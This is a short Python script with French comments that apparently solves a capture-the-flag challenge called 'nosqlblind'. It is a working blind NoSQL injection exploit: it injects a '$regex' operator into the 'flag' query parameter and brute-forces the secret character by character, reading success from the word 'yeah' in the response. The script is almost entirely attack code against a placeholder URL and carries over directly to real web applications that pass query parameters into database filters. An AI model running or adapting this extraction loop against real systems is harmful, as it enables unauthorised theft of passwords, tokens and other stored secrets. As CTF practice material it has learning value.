import requests
import string

url = 'http://XXX.XXX'

# Paramètres de la requête (défi et expression régulière)
params = {
    'chall_name': 'nosqlblind',
    'flag[$regex]': ''  # Expression régulière, à remplir caractère par caractère
}

characters = string.ascii_letters + string.digits + string.punctuation
flag = ""

for i in range(21):  
    found = False
    for char in characters:
        params['flag[$regex]'] = f'^{flag}{char}.*$'
        response = requests.get(url, params=params)

        if response.status_code == 200 and 'yeah' in response.text:
            found = True
            flag += char
            print(f"Trouvé : {flag}")
            break 
  
    if not found:
        print("Aucun caractère trouvé à cette position.")
        break

print("Le flag complet est :", flag)
